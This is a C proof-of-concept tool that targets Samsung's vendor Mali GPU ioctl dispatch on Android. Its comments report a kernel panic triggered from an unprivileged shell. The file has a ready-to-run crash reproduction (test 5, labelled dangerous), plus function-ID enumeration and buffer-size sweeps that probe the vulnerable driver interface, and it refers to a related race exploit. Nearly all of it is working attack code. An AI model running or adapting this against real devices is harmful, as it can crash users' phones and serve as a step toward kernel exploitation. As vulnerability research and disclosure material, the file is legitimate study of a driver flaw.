/*
 * mali_vendor_crash.c — Samsung vendor dispatch crash PoC
 *
 * DISCOVERY: Using ioctl magic 0x80 (instead of 'M'/0x4D) dispatches
 * to Samsung's gpu_vendor_dispatch(), NOT the standard kbase dispatch.
 * Sending a 48-byte MEM_IMPORT-like struct via magic 0x80 causes:
 *   PC is at _raw_spin_lock_irqsave+0x30/0x6c
 *   LR is at down+0x18/0x54
 * → Kernel panic from unprivileged shell!
 *
 * This is a Samsung-specific vulnerability in the vendor Mali dispatch.
 *
 * This tool:
 * A) Confirms which ioctl magic+size triggers the crash
 * B) Tests the CORRECT import path (magic 'M') as control
 * C) Characterizes the vendor dispatch surface
 *
 * Build: arm-linux-gnueabi-gcc -static -pie -fPIE -o mali_vendor_crash mali_vendor_crash.c -lpthread
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <linux/ioctl.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <unistd.h>

struct uk_header { uint32_t id; uint32_t ret; };

/* Two different command encodings */
static unsigned int make_cmd_mali(uint32_t sz) {
    /* Standard kbase: magic 'M' (0x4D) */
    return _IOC(_IOC_READ | _IOC_WRITE, 'M', 0, sz);
}

static unsigned int make_cmd_vendor(uint32_t sz) {
    /* Samsung vendor dispatch: magic 0x80 */
    return _IOC(_IOC_READ | _IOC_WRITE, 0x80, 0, sz);
}

static int mali_open_ctx_vendor(void) {
    int fd = open("/dev/mali0", O_RDWR | O_CLOEXEC);
    if (fd < 0) return -1;
    /* Handshake with CORRECT magic 'M' */
    uint8_t hb[16];
    memset(hb, 0, 16);
    ((struct uk_header*)hb)->id = 0; hb[8] = 10;
    if (ioctl(fd, make_cmd_mali(16), hb) < 0) { close(fd); return -1; }
    memset(hb, 0, 16);
    ((struct uk_header*)hb)->id = 530;
    if (ioctl(fd, make_cmd_mali(16), hb) < 0) { close(fd); return -1; }
    return fd;
}

static int mali_open_ctx_vendor_hs(void) {
    /* Handshake with 0x80 magic */
    int fd = open("/dev/mali0", O_RDWR | O_CLOEXEC);
    if (fd < 0) return -1;
    uint8_t hb[16];
    memset(hb, 0, 16);
    ((struct uk_header*)hb)->id = 0; hb[8] = 10;
    if (ioctl(fd, make_cmd_vendor(16), hb) < 0) { close(fd); return -1; }
    memset(hb, 0, 16);
    ((struct uk_header*)hb)->id = 530;
    if (ioctl(fd, make_cmd_vendor(16), hb) < 0) { close(fd); return -1; }
    return fd;
}

static int ion_alloc_fd(void) {
    int ion = open("/dev/ion", O_RDONLY | O_CLOEXEC);
    if (ion < 0) return -1;
    struct {
        uint64_t len; uint64_t align;
        uint32_t heap_id_mask; uint32_t flags; int32_t fd;
    } d = { .len = 4096, .align = 4096, .heap_id_mask = 1, .flags = 0, .fd = -1 };
    int r = ioctl(ion, 0xc0144900, &d);
    close(ion);
    if (r == 0 && d.fd >= 0) return d.fd;
    return -1;
}

/* Fork-isolated test */
static int run_test(const char *name, void (*fn)(void)) {
    fprintf(stderr, "\n=== %s ===\n", name);
    fflush(stderr);

    pid_t pid = fork();
    if (pid == 0) {
        alarm(5);
        fn();
        _exit(0);
    }
    int status;
    waitpid(pid, &status, 0);
    if (WIFSIGNALED(status)) {
        fprintf(stderr, "  *** KILLED by signal %d ***\n", WTERMSIG(status));
        return -1;
    }
    if (WIFEXITED(status) && WEXITSTATUS(status) == 14) {
        fprintf(stderr, "  *** TIMEOUT (SIGALRM) ***\n");
        return -2;
    }
    fprintf(stderr, "  exited: %d\n", WEXITSTATUS(status));
    return WEXITSTATUS(status);
}

/* ====================================================================== */
/* TEST 1: Correct import via magic 'M' (control — should be safe)        */
/* ====================================================================== */
static void test1_correct_import(void) {
    int mali_fd = mali_open_ctx_vendor();
    if (mali_fd < 0) { fprintf(stderr, "  Mali open failed\n"); return; }
    int dma_fd = ion_alloc_fd();
    if (dma_fd < 0) { fprintf(stderr, "  ION alloc failed\n"); close(mali_fd); return; }

    uint8_t buf[48];
    memset(buf, 0, 48);
    ((struct uk_header*)buf)->id = 513;  /* MEM_IMPORT */
    *(uint64_t*)(buf + 8) = (uintptr_t)&dma_fd;  /* POINTER to fd */
    *(uint32_t*)(buf + 16) = 2;  /* type = UMM */
    *(uint32_t*)(buf + 40) = 0x4000000F;  /* IMPORT_SHARED + RW */

    fprintf(stderr, "  MEM_IMPORT via magic 'M' (correct path)...\n");
    int r = ioctl(mali_fd, make_cmd_mali(48), buf);
    int e = errno;
    uint32_t result = ((struct uk_header*)buf)->id;
    fprintf(stderr, "  ioctl=%d errno=%d result=%u\n", r, e, result);

    close(dma_fd);
    close(mali_fd);
}

/* ====================================================================== */
/* TEST 2: Vendor dispatch with func 513 (import) — NO ION fd             */
/* ====================================================================== */
static void test2_vendor_no_ion(void) {
    int mali_fd = mali_open_ctx_vendor();
    if (mali_fd < 0) { fprintf(stderr, "  Mali open failed\n"); return; }

    uint8_t buf[48];
    memset(buf, 0, 48);
    ((struct uk_header*)buf)->id = 513;

    fprintf(stderr, "  Vendor dispatch func=513, zero payload...\n");
    int r = ioctl(mali_fd, make_cmd_vendor(48), buf);
    int e = errno;
    uint32_t result = ((struct uk_header*)buf)->id;
    fprintf(stderr, "  ioctl=%d errno=%d result=%u\n", r, e, result);

    close(mali_fd);
}

/* ====================================================================== */
/* TEST 3: Vendor dispatch — enumerate func IDs that don't crash          */
/* ====================================================================== */
static volatile int safe_id = 0;
static void test3_single_id(void) {
    int fd = open("/dev/mali0", O_RDWR | O_CLOEXEC);
    if (fd < 0) return;

    /* Handshake with 'M' first */
    uint8_t hb[16];
    memset(hb, 0, 16);
    ((struct uk_header*)hb)->id = 0; hb[8] = 10;
    ioctl(fd, make_cmd_mali(16), hb);
    memset(hb, 0, 16);
    ((struct uk_header*)hb)->id = 530;
    ioctl(fd, make_cmd_mali(16), hb);

    /* Now send vendor dispatch with this func ID */
    uint8_t buf[16];
    memset(buf, 0, 16);
    ((struct uk_header*)buf)->id = safe_id;
    int r = ioctl(fd, make_cmd_vendor(16), buf);
    uint32_t result = ((struct uk_header*)buf)->id;
    fprintf(stderr, "  func=%3d: ioctl=%d(e=%d) result=%u\n",
            safe_id, r, (r < 0) ? errno : 0, result);
    close(fd);
}

static void test3_enum(void) {
    fprintf(stderr, "\n=== TEST 3: Vendor dispatch func ID enumeration ===\n");
    fprintf(stderr, "  Magic 0x80, size 16, zeroed payload\n\n");

    /* Test Samsung vendor func IDs — typically in the 1000+ range */
    int ids[] = {
        0, 1, 2, 10, 100, 200, 300, 400, 500,
        510, 511, 512, 513, 514, 515, 516, 517, 518, 519,
        520, 521, 522, 530, 536, 540, 541,
        550, 600, 700, 800, 900, 999, 1000, 1001, 1002,
        /* Samsung vendor range */
        0x10000, 0x10001, 0x10002,
    };
    int n_ids = sizeof(ids) / sizeof(ids[0]);

    for (int i = 0; i < n_ids; i++) {
        safe_id = ids[i];
        pid_t pid = fork();
        if (pid == 0) {
            alarm(3);
            test3_single_id();
            _exit(0);
        }
        int status;
        waitpid(pid, &status, 0);
        if (WIFSIGNALED(status)) {
            fprintf(stderr, "  func=%d *** CRASH (signal %d) ***\n",
                    ids[i], WTERMSIG(status));
        }
    }
}

/* ====================================================================== */
/* TEST 4: Vendor dispatch size sweep (func 513)                          */
/* ====================================================================== */
static volatile int sweep_size = 0;
static void test4_single_size(void) {
    int fd = open("/dev/mali0", O_RDWR | O_CLOEXEC);
    if (fd < 0) return;

    uint8_t hb[16];
    memset(hb, 0, 16);
    ((struct uk_header*)hb)->id = 0; hb[8] = 10;
    ioctl(fd, make_cmd_mali(16), hb);
    memset(hb, 0, 16);
    ((struct uk_header*)hb)->id = 530;
    ioctl(fd, make_cmd_mali(16), hb);

    uint8_t buf[536];
    memset(buf, 0, sizeof(buf));
    ((struct uk_header*)buf)->id = 513;

    int r = ioctl(fd, make_cmd_vendor(sweep_size), buf);
    uint32_t result = ((struct uk_header*)buf)->id;
    fprintf(stderr, "  func=513 sz=%3d: ioctl=%d(e=%d) result=%u\n",
            sweep_size, r, (r < 0) ? errno : 0, result);
    close(fd);
}

static void test4_size_sweep(void) {
    fprintf(stderr, "\n=== TEST 4: Vendor dispatch size sweep (func=513) ===\n\n");

    int sizes[] = { 8, 16, 24, 32, 40, 48, 56, 64, 80, 128, 256, 536 };
    int n = sizeof(sizes) / sizeof(sizes[0]);

    for (int i = 0; i < n; i++) {
        sweep_size = sizes[i];
        pid_t pid = fork();
        if (pid == 0) {
            alarm(3);
            test4_single_size();
            _exit(0);
        }
        int status;
        waitpid(pid, &status, 0);
        if (WIFSIGNALED(status)) {
            fprintf(stderr, "  sz=%d *** CRASH (signal %d) ***\n",
                    sizes[i], WTERMSIG(status));
        }
    }
}

/* ====================================================================== */
/* TEST 5: Minimal crash repro — exact conditions from mali_race          */
/* ====================================================================== */
static void test5_exact_crash(void) {
    int fd = open("/dev/mali0", O_RDWR | O_CLOEXEC);
    if (fd < 0) return;

    /* Handshake via 0x80 (what mali_race used) */
    uint8_t hb[16];
    memset(hb, 0, 16);
    ((struct uk_header*)hb)->id = 0; hb[8] = 10;
    ioctl(fd, make_cmd_vendor(16), hb);
    memset(hb, 0, 16);
    ((struct uk_header*)hb)->id = 530;
    ioctl(fd, make_cmd_vendor(16), hb);

    int dma_fd = ion_alloc_fd();
    fprintf(stderr, "  dma_fd=%d\n", dma_fd);

    /* Exact layout from mali_race_exploit.c / mali_import_crash.c */
    uint8_t buf[48];
    memset(buf, 0, 48);
    ((struct uk_header*)buf)->id = 513;
    *(uint64_t*)(buf + 8) = (uint64_t)dma_fd;  /* raw fd, not pointer */
    *(uint64_t*)(buf + 16) = 1;  /* type */

    fprintf(stderr, "  Sending vendor dispatch (magic=0x80, func=513, sz=48)...\n");
    int r = ioctl(fd, make_cmd_vendor(48), buf);
    fprintf(stderr, "  ioctl=%d errno=%d result=%u\n", r, errno, ((struct uk_header*)buf)->id);

    if (dma_fd >= 0) close(dma_fd);
    close(fd);
}

int main(int argc, char **argv) {
    fprintf(stderr, "=== Mali Samsung Vendor Dispatch Crash Analysis ===\n");
    fprintf(stderr, "PID=%d UID=%d\n\n", getpid(), getuid());

    int test = 0;
    if (argc >= 2) test = atoi(argv[1]);

    switch (test) {
        case 1:
            run_test("TEST 1: Correct import (magic 'M', control)", test1_correct_import);
            break;
        case 2:
            run_test("TEST 2: Vendor func=513, no ION", test2_vendor_no_ion);
            break;
        case 3:
            test3_enum();
            break;
        case 4:
            test4_size_sweep();
            break;
        case 5:
            run_test("TEST 5: Exact crash repro", test5_exact_crash);
            break;
        default:
            fprintf(stderr, "Usage: %s <test_num>\n", argv[0]);
            fprintf(stderr, "  1 = Correct import via 'M' (safe control)\n");
            fprintf(stderr, "  2 = Vendor func=513 zeroed (probe)\n");
            fprintf(stderr, "  3 = Vendor func ID enumeration (safe)\n");
            fprintf(stderr, "  4 = Vendor func=513 size sweep\n");
            fprintf(stderr, "  5 = Exact crash repro (DANGEROUS)\n");
            break;
    }

    fprintf(stderr, "\n--- dmesg ---\n");
    system("dmesg 2>/dev/null | tail -5 | grep -iE 'mali|kbase|oops|bug|panic|fault|vendor' 2>/dev/null");
    fprintf(stderr, "=== Done ===\n");
    return 0;
}
